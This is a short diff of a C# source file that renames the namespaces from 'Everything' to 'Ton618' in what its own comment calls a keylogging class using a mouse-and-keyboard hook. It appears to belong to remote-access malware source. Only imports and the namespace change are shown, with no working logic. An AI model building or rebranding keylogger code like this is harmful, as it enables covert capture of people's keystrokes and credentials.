@@ -1,8 +1,4 @@
-﻿using Everything.Config;
-using Everything.Extensions;
-using Everything.Helper;
-using Everything.MouseKeyHook;
-using Q3C273.Shared.Cryptography;
+﻿using Q3C273.Shared.Cryptography;
 using Q3C273.Shared.Helpers;
 using System;
 using System.Collections.Generic;
@@ -12,9 +8,13 @@ using System.IO;
 using System.Text;
 using System.Web;
 using System.Windows.Forms;
+using Ton618.Config;
+using Ton618.Extensions;
+using Ton618.Helper;
+using Ton618.MouseKeyHook;
 using Timer = System.Timers.Timer;
 
-namespace Everything.Logging
+namespace Ton618.Logging
 {
     /// <summary>
     /// This class provides keylogging functionality and modifies/highlights the output for
